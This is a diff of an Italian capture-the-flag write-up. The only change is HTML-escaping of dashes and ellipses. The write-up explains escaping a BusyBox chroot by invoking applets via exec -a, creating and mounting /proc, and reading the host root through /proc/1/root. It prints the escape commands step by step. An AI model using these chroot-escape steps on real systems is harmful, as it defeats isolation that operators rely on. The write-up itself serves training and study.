@@ -32,7 +32,7 @@ Challenge da 77 punti la cui superficie è una singola shell. Ci si collega via 
 
 Il punto della challenge è che /bin/sh è BusyBox, e BusyBox è un multi-call binary: tutte le applet (mount, ls, cat, chroot, nsenter, nc) sono dentro quell'unico eseguibile e si raggiungono cambiando il nome con cui lo si invoca, cioè con exec -a. Da lì si crea /proc a mano, si monta il filesystem proc, e /proc/1/root dà accesso alla root filesystem del processo PID 1, che sta fuori dal chroot. La flag è in /root
 
-Catena: openssl s_client → shell BusyBox ash in chroot → enumerazione, filesystem a due directory → exec -a busybox /bin/sh --list rivela tutte le applet → exec -a id conferma uid=0 → mkdir /proc via applet → mount -t proc → /proc/1/root → /root/flag.txt.
+Catena: openssl s_client → shell BusyBox ash in chroot → enumerazione, filesystem a due directory → exec -a busybox /bin/sh &#45;&#45;list rivela tutte le applet → exec -a id conferma uid=0 → mkdir /proc via applet → mount -t proc → /proc/1/root → /root/flag.txt.
 
 ---
 
@@ -204,31 +204,31 @@ la svolta è nel dato della Fase 2 che avevo registrato e non usato: BB_ASH_VERS
 
 il builtin exec accetta -a per impostare argv[0] a piacere. quindi:
 
-~ # exec -a busybox /bin/sh --list
+~ # exec -a busybox /bin/sh &#45;&#45;list
 [
 [[
 acpid
-...
+&#46;&#46;&#46;
 cat
-...
+&#46;&#46;&#46;
 chroot
-...
+&#46;&#46;&#46;
 id
-...
+&#46;&#46;&#46;
 ls
-...
+&#46;&#46;&#46;
 mount
-...
+&#46;&#46;&#46;
 nc
-...
+&#46;&#46;&#46;
 nsenter
-...
+&#46;&#46;&#46;
 pivot_root
-...
+&#46;&#46;&#46;
 switch_root
-...
+&#46;&#46;&#46;
 unshare
-...
+&#46;&#46;&#46;
 zcip
 
 l'elenco completo, centinaia di applet. dentro ci sono tutte le cose che avevo cercato come binari separati e che non esistevano: mount, chroot, nsenter, unshare, pivot_root, switch_root, nc, ls, id, cat, wget, vi.
@@ -280,7 +280,7 @@ e il filesystem proc è quello reale dell'host:
 108
 112
 12
-...
+&#46;&#46;&#46;
 954
 955
 96
@@ -291,7 +291,7 @@ cgroups
 cmdline
 consoles
 cpuinfo
-...
+&#46;&#46;&#46;
 self
 slabinfo
 softirqs
@@ -349,7 +349,7 @@ openssl s_client verso l'istanza assegnata → shell /bin/sh in chroot, prompt r
 → nessun /proc, /dev, /sbin, /usr; nessuna utility esterna; nessun dotfile
 → vicoli ciechi: /flag inesistente, .. confinato, ld-musl diretto si blocca, chroot/mount/nc/socat not found
 → kill -0 1 restituisce 0, il PID 1 è raggiungibile ma senza /proc è inutilizzabile
-→ /bin/sh è BusyBox: exec -a busybox /bin/sh --list espone tutte le applet
+→ /bin/sh è BusyBox: exec -a busybox /bin/sh &#45;&#45;list espone tutte le applet
 → exec -a id /bin/sh conferma uid=0 gid=0
 → mount diretto fallisce, il mount point non esiste
 → sh -c 'exec -a mkdir /bin/sh /proc' crea la directory senza uccidere la shell
@@ -376,4 +376,4 @@ exec sostituisce il processo, sh -c lo incapsula. banale, ma è la differenza fr
 
 ## Tool utilizzati
 
-openssl s_client, BusyBox 1.37.0 invocato via exec -a (applet busybox --list, id, mkdir, mount, ls, cat), builtin di ash (echo con glob, set, export, help, type, command -V, kill, printf, history)
+openssl s_client, BusyBox 1.37.0 invocato via exec -a (applet busybox &#45;&#45;list, id, mkdir, mount, ls, cat), builtin di ash (echo con glob, set, export, help, type, command -V, kill, printf, history)
